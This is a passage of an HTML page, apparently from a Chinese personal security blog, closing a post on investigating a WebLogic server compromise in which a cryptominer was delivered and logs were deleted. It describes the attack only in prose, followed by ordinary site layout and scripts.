class="identifier">SocketReaderRequest</span>.</span></span>java:<span class="number">43</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">	at weblogic.kernel.<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>execute(<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>java:<span class="number">147</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">	at weblogic.kernel.<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>java:<span class="number">119</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">&gt;</span></pre></td></tr></table></figure>
+<p>历史记录被删除了，感觉好多数据都被删除了。</p>
+<p><img src="9.jpg" alt=""></p>
+<p>发现登陆记录被删除了</p>
+<p><img src="10.jpg" alt=""></p>
+<p>果然重要信息都被清除掉了，太现实了~</p>
+<p><img src="11.jpg" alt=" /var/log"></p>
+<h2 id="来缕一缕思路"><a href="#来缕一缕思路" class="headerlink" title="来缕一缕思路"></a>来缕一缕思路</h2><p>手先通过扫描，发现我的靶机存在漏洞。</p>
+<p><img src="7.jpg" alt="事件调查"></p>
+<p>通过curl 和wget 投递挖矿程序-&gt;访问恶意ip执行了挖矿程序-&gt;脚本传入了挖矿程序后，运行后顺便把记录删了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/25/CVE-2020-14645-%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8/" rel="prev" title="CVE-2020-14645快速利用复现">
+      <i class="fa fa-chevron-left"></i> CVE-2020-14645快速利用复现
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#事情的起因"><span class="nav-number">1.</span> <span class="nav-text">事情的起因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#从阿里云上看告警监测"><span class="nav-number">2.</span> <span class="nav-text">从阿里云上看告警监测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志分析"><span class="nav-number">3.</span> <span class="nav-text">日志分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#来缕一缕思路"><span class="nav-number">4.</span> <span class="nav-text">来缕一缕思路</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">47</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
